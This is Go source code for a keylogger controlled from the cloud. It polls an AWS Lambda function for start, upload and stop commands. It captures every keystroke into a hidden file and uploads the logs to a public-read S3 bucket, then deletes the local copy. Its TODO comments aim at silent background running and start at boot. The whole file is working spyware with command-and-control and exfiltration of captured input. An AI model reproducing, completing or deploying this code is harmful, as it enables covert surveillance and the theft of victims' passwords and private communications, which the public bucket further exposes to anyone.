package main

import (
	"fmt"
	"os"
	"time"
	"strings"
	"encoding/json"
	"github.com/robotn/gohook"
	"github.com/joho/godotenv"

	"github.com/aws/aws-sdk-go/aws"
	"github.com/aws/aws-sdk-go/aws/session"
	"github.com/aws/aws-sdk-go/service/s3"
	//"github.com/aws/aws-sdk-go/service/dynamodb"
	"github.com/aws/aws-sdk-go/service/lambda"
)

// TO IMPLEMENT:
// Make it run silently in the bg
// Find a way to implement boot on startup
// AWS Lambda gets notified that a curr_cmd gets changed in dynamoDB and then sends a req to change the cmd in GO

type keylog_lambda struct {
	Function   string `json:"function"`
	HostName   string `json:"hostName"`
	Cmd        string `json:"cmd"`
}

type response struct {
	StatusCode int    `'json:"statusCode"`
	Body 	   string `'json:"body"`
}

func main() {

	err := godotenv.Load()
	if err != nil {
		panic(err)
	}

	hostName, err := os.Hostname()
	if err != nil {
		panic(err)
	}

	putHost(hostName)

	var count int = 1

	runTime := time.Now()

	cmdChan := make(chan string)
	go pollCmds(hostName, cmdChan)

	for {
		cmd := <-cmdChan

		fileName := fmt.Sprintf(".%s - %s %s (%d).txt",
		hostName,
		runTime.Format("Jan 02 2006"),
		runTime.Format(time.Kitchen),
		count)

		if cmd == "start" {
			go startKeylog(hostName, fileName, cmdChan)
		}
		if cmd == "upload" {
			go uploadFile(fileName, count)
			count++
			hook.StopEvent()
		}
		if cmd == "stop" {
			hook.StopEvent()
		}
	}
}

func pollCmds(hostName string, cmdChan chan<- string) {
	var lastCmd string

	for {
		time.Sleep(5 * time.Second)
		cmd := getCmd(hostName)
		if cmd != lastCmd { 
			lastCmd = cmd
			cmdChan <- cmd
		}
	}
}

func startKeylog(hostName string, fileName string, cmdChan chan string) {
	evChan := hook.Start()

	var lastTime time.Time

	file, err := os.Create(fileName)
	if err != nil {
		panic(err)
	}
	defer file.Close()

	for ev := range evChan {
		// Calcs diff between time
		now := time.Now()
		var diff time.Duration
		if !lastTime.IsZero() {
			diff = now.Sub(lastTime)
		}
		lastTime = now

		// If diff > 5 print a new line for ease of reading
		if diff.Seconds() > 5 {
			file.WriteString("\n")
		}

		// Print to file any keystroke recorded and their keychar value
		if ev.Kind == hook.KeyDown {
			file.WriteString(hook.RawcodetoKeychar(ev.Rawcode))
		}
	}
}

func uploadFile(fileName string, count int) error {

	file, err := os.Open(fileName)
	if err != nil {
		panic(err)
	}
	defer file.Close()

	sess := session.Must(session.NewSession(&aws.Config{
		Region: aws.String("ap-southeast-2"),
	}))

	s3client := s3.New(sess)

	_, err = s3client.PutObject(&s3.PutObjectInput{
		Bucket: aws.String("vialathor-keylog"),
		Key:    aws.String(fileName),
		Body:   file,
		ACL:    aws.String("public-read"),
	})

	os.Remove(fileName)

	return err
}

func getCmd(hostName string) string {

	sess := session.Must(session.NewSessionWithOptions(session.Options{
		SharedConfigState: session.SharedConfigEnable,
	}))
	
	client := lambda.New(sess, &aws.Config{Region: aws.String("ap-southeast-2")})
	request := keylog_lambda{
		Function:   "get_cmd",
		HostName: hostName,
		Cmd:      "",
	}

	payload, err := json.Marshal(request)
	if err != nil {
		panic(err)
	}

	result, err := client.Invoke(&lambda.InvokeInput{FunctionName: aws.String("keylog_lambda"), Payload: payload})
	
	var lambdaResp response
	err = json.Unmarshal(result.Payload, &lambdaResp)
	if err != nil {
		panic(err)
	}
	
	cmd := lambdaResp.Body
	cmd = strings.Trim(cmd, `"`)
	
	return cmd

}

func putHost(hostName string) error {

	sess := session.Must(session.NewSessionWithOptions(session.Options{
		SharedConfigState: session.SharedConfigEnable,
	}))
	
	client := lambda.New(sess, &aws.Config{Region: aws.String("ap-southeast-2")})
	request := keylog_lambda{
		Function:   "set_cmd",
		HostName: hostName,
		Cmd:      "idle",
	}

	payload, err := json.Marshal(request)
	if err != nil {
		panic(err)
	}

	_, err = client.Invoke(&lambda.InvokeInput{FunctionName: aws.String("keylog_lambda"), Payload: payload})
	if err != nil {
		panic(err)
	}

	return err
}